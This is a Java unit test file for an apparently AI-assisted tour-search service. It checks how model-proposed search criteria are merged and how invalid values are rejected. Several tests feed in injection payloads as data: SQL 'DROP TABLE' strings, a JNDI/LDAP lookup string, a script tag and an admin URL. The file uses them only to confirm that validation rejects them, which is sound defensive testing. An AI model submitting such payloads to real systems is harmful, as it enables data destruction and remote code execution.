package com.example.ai_service.conversation;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import java.time.LocalDate;
import java.util.*;
import static org.assertj.core.api.Assertions.*;
import static com.example.ai_service.conversation.ChatModels.*;

class CriteriaMergerTest {
    final CriteriaMerger merger=new CriteriaMerger();
    static final LocalDate TODAY=LocalDate.of(2026,10,23);
    static final List<Location> PLACES=List.of(
            new Location(24,"Sa Pa","DESTINATION",Region.NORTH,24,List.of(24,25),true),
            new Location(25,"Sapa","DESTINATION",Region.NORTH,24,List.of(24,25),true),
            new Location(30,"Quảng Nam","DESTINATION",Region.CENTRAL,30,List.of(30),true),
            new Location(31,"Đà Nẵng","DEPARTURE",Region.CENTRAL,31,List.of(31),true));
    static Change set(Field field,String value) { return new Change(field,Action.SET,value); }
    static Change clear(Field field) { return new Change(field,Action.CLEAR,""); }
    static Plan plan(Change... changes) { return new Plan(Intent.SEARCH_TOURS,false,List.of(changes),List.of(),Hint.NONE); }
    static Criteria central() { return new Criteria(Region.CENTRAL,30,31,5000000L,BudgetScope.PER_ADULT,
            LocalDate.of(2026,11,1),LocalDate.of(2026,11,30),new Party(2,1,0,0,0),SearchMode.BOOKABLE); }
    CriteriaMerger.Merged merge(Criteria previous,Plan plan) { return merger.merge(previous,plan,()->PLACES,TODAY); }
    @Test void loweringBudgetPreservesAllOtherCriteria() {
        var changed=merge(central(),plan(set(Field.MAX_BUDGET_VND,"3000000"))).criteria();
        assertThat(changed.region()).isEqualTo(Region.CENTRAL); assertThat(changed.destinationId()).isEqualTo(30);
        assertThat(changed.maxBudgetVnd()).isEqualTo(3000000L); assertThat(changed.budgetScope()).isEqualTo(BudgetScope.PER_ADULT);
        assertThat(changed.party()).isEqualTo(central().party()); assertThat(changed.departureFrom()).isEqualTo(central().departureFrom());
    }
    @Test void clearingBudgetClearsScopeAndResetDropsOldState() {
        var cleared=merge(central(),plan(clear(Field.MAX_BUDGET_VND))).criteria();
        assertThat(cleared.maxBudgetVnd()).isNull(); assertThat(cleared.budgetScope()).isNull();
        var reset=merge(central(),new Plan(Intent.SEARCH_TOURS,true,List.of(set(Field.REGION,"SOUTH")),List.of(),Hint.NONE)).criteria();
        assertThat(reset).isEqualTo(new Criteria(Region.SOUTH,null,null,null,null,null,null,null,SearchMode.BOOKABLE));
    }
    @Test void changingRegionClearsConflictingDestinationButKeepsBudget() {
        var changed=merge(central(),plan(set(Field.REGION,"NORTH"))).criteria();
        assertThat(changed.destinationId()).isNull(); assertThat(changed.region()).isEqualTo(Region.NORTH);
        assertThat(changed.maxBudgetVnd()).isEqualTo(5000000L);
    }
    @Test void destinationAliasesResolveToActualCanonicalIdAndChangeRegion() {
        for(String name:List.of("sa pa","Sapa","Sa Pa")) {
            var changed=merge(central(),plan(set(Field.DESTINATION,name))).criteria();
            assertThat(changed.destinationId()).isEqualTo(24); assertThat(changed.region()).isEqualTo(Region.NORTH);
        }
    }
    @Test void explicitGeographicConflictNeedsClarificationAndPreservesOtherKnownFacts() {
        var result=merge(central(),plan(set(Field.REGION,"NORTH"),set(Field.DESTINATION,"Quảng Nam"),set(Field.MAX_BUDGET_VND,"2500000")));
        assertThat(result.hint()).isEqualTo(Hint.AMBIGUOUS_REQUEST); assertThat(result.criteria().region()).isEqualTo(Region.CENTRAL);
        assertThat(result.criteria().maxBudgetVnd()).isEqualTo(2500000L);
    }
    @Test void unknownDestinationNeverLeavesConflictingOldId() {
        var result=merge(central(),plan(set(Field.REGION,"NORTH"),set(Field.DESTINATION,"Atlantis")));
        assertThat(result.hint()).isEqualTo(Hint.UNKNOWN_DESTINATION); assertThat(result.criteria().destinationId()).isNull();
    }
    @Test void partyPatchMergesAndExplicitZeroDoesNotMeanUnknown() {
        var result=merge(central(),plan(set(Field.CHILDREN,"2"),clear(Field.TODDLERS))).criteria().party();
        assertThat(result.adults()).isEqualTo(2); assertThat(result.children()).isEqualTo(2); assertThat(result.toddlers()).isNull();
        var alone=merge(central(),plan(set(Field.ADULTS,"1"),set(Field.CHILDREN,"0"),set(Field.TODDLERS,"0"),set(Field.INFANTS,"0"),set(Field.UNCLASSIFIED_CHILDREN,"0")));
        assertThat(alone.criteria().party()).isEqualTo(new Party(1,0,0,0,0));
    }
    @Test void missingScopeAndMissingAgesAreAskedBeforeCatalog() {
        var missing=merge(Criteria.empty(),plan(set(Field.REGION,"CENTRAL"),set(Field.MAX_BUDGET_VND,"3000000")));
        assertThat(missing.hint()).isEqualTo(Hint.BUDGET_SCOPE_REQUIRED);
        var clarified=merge(missing.criteria(),plan(set(Field.BUDGET_SCOPE,"PER_ADULT")));
        assertThat(clarified.hint()).isEqualTo(Hint.NONE); assertThat(clarified.criteria().maxBudgetVnd()).isEqualTo(3000000L);
        var group=merge(missing.criteria(),plan(set(Field.BUDGET_SCOPE,"TOTAL_GROUP"),set(Field.ADULTS,"2"),set(Field.UNCLASSIFIED_CHILDREN,"1")));
        assertThat(group.hint()).isEqualTo(Hint.PASSENGER_DETAILS_REQUIRED);
    }
    @ParameterizedTest @ValueSource(strings={"-1","0.5","3e6","1000000000001","3000000; DROP TABLE tour"})
    void invalidMoneyPatchRejected(String value) {
        assertThatThrownBy(()->merge(central(),plan(set(Field.MAX_BUDGET_VND,value)))).hasMessage("AI_INVALID_OUTPUT");
    }
    @Test void invalidDatesCountsAndDuplicateFieldsRejected() {
        assertThatThrownBy(()->merge(central(),plan(set(Field.DEPARTURE_FROM,"2026-02-30")))).hasMessage("AI_INVALID_OUTPUT");
        assertThatThrownBy(()->merge(central(),plan(set(Field.ADULTS,"101")))).hasMessage("AI_INVALID_OUTPUT");
        assertThatThrownBy(()->merge(central(),plan(set(Field.ADULTS,"100")))).hasMessage("AI_INVALID_OUTPUT");
        assertThatThrownBy(()->merge(central(),plan(set(Field.REGION,"NORTH"),clear(Field.REGION)))).hasMessage("AI_INVALID_OUTPUT");
    }
    @Test void moneyUnitAmbiguityCannotSetAnAssumedAmount() {
        var ambiguous=new Plan(Intent.CLARIFY,false,List.of(set(Field.MAX_BUDGET_VND,"3000000")),List.of(),Hint.BUDGET_UNIT_REQUIRED);
        assertThatThrownBy(()->merge(Criteria.empty(),ambiguous)).hasMessage("AI_INVALID_OUTPUT");
    }
    @Test void detailCannotChangeCriteriaAndReferencesCannotInventIds() {
        var invalid=new Plan(Intent.DETAIL_TOUR,false,List.of(set(Field.REGION,"NORTH")),List.of(2),Hint.NONE);
        assertThatThrownBy(()->merge(central(),invalid)).hasMessage("AI_INVALID_OUTPUT");
        assertThat(TourReferences.resolve(List.of(901,908),List.of(2))).containsExactly(908);
        assertThat(TourReferences.resolve(List.of(901,908),List.of(3))).isEmpty();
        assertThat(TourReferences.resolve(List.of(901,908),List.of(1,1))).isEmpty();
    }
    @Test void pureBudgetChangeDoesNotNeedLocationLookup() {
        var previous=new Criteria(Region.CENTRAL,null,null,5000000L,BudgetScope.PER_ADULT,null,null,null,SearchMode.BOOKABLE);
        var changed=merger.merge(previous,plan(set(Field.MAX_BUDGET_VND,"3000000")),()->{ throw new AssertionError("Unneeded lookup"); },TODAY);
        assertThat(changed.hint()).isEqualTo(Hint.NONE);
    }
    @Test void modelCannotSmuggleSqlMarkupOrUrlsThroughLocationFields() {
        var lookups=new java.util.concurrent.atomic.AtomicInteger();
        for(Field field:java.util.List.of(Field.ORIGIN,Field.DESTINATION)) {
            for(String value:java.util.List.of("Hà Nội'; DROP TABLE users; --","http://localhost/admin","${jndi:ldap://example.test}","<script>bad()</script>")) {
                org.assertj.core.api.Assertions.assertThatThrownBy(()->new CriteriaMerger().merge(Criteria.empty(),plan(set(field,value)),()->{lookups.incrementAndGet();return PLACES;},java.time.LocalDate.of(2026,10,26)))
                    .isInstanceOf(com.example.ai_service.model.ModelFailure.class).hasMessage("AI_INVALID_OUTPUT");
            }
        }
        org.assertj.core.api.Assertions.assertThat(lookups).hasValue(0);
    }
}
